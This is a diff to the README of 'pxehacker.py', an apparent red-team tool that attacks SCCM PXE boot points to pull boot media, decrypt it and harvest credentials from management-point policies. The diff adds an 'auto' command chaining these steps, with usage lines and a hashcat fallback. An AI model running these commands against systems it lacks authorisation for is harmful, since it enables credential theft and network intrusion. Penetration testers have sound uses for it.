@@ -37,11 +37,16 @@ If you already know the PXE Distribution Point IP, skip `discover`. `discover` u
 # 1. Identify the source IP the target will see
 ip route get <target_ip>
 
-# 2. Pull the PXE media, derive/decrypt the media key, and extract variables.xml + PFX
-.venv/bin/python pxehacker.py attack <target_ip> <src_ip> -o ./loot
+# 2. Run the full chain in one command: PXE attack, then policy retrieval
+.venv/bin/python pxehacker.py auto <target_ip> <src_ip> -o ./loot --mp http://<target_ip>
+```
 
-# 3. Retrieve policies and extract credentials
-# Use --mp if the management point hostname in variables.xml does not resolve on your box
+`auto` only chains into `policies` if `attack` produced a decrypted `variables.xml` — if the media is password-protected and no weak/default password matches, it stops and hands you the hashcat hash (same as `attack` alone), and you finish manually with `-p <cracked_hex>` then `policies`.
+
+Prefer to run each step yourself (e.g. to inspect `variables.xml` before hitting the MP, or re-run just `policies` against a different MP)? The individual subcommands below still work exactly as before:
+
+```bash
+.venv/bin/python pxehacker.py attack <target_ip> <src_ip> -o ./loot
 .venv/bin/python pxehacker.py policies ./loot/variables.xml -o ./loot --mp http://<target_ip>
 ```
 
@@ -80,6 +85,16 @@ sudo "$(pwd)/.venv/bin/python" pxehacker.py discover [-i INTERFACE] [-t TIMEOUT]
 |------|-------------|
 | `-i` | Network interface (auto-detect if omitted) |
 | `-t` | DHCP timeout in seconds (default: 10) |
+
+### `auto` — Full chain (attack + policies)
+
+Runs `attack` then, if it produces a decrypted `variables.xml`, immediately chains into `policies` — one command instead of two.
+
+```bash
+.venv/bin/python pxehacker.py auto <target> <src_ip> [socks_host socks_port] [-p PASSWORD] [-o OUTPUT] [--mac MAC] [--mp URL] [--fallback-local]
+```
+
+Takes the same arguments as `attack` plus `policies`' `--mp`, `--fallback-local`, and `--fallback-input`. If the attack stage can't auto-decrypt the media (password-protected, no weak-password match), it stops there and prints the hashcat hash — same as running `attack` alone — rather than attempting `policies` against nothing. Exits non-zero if either stage fails.
 
 ### `attack` — PXE boot attack
 
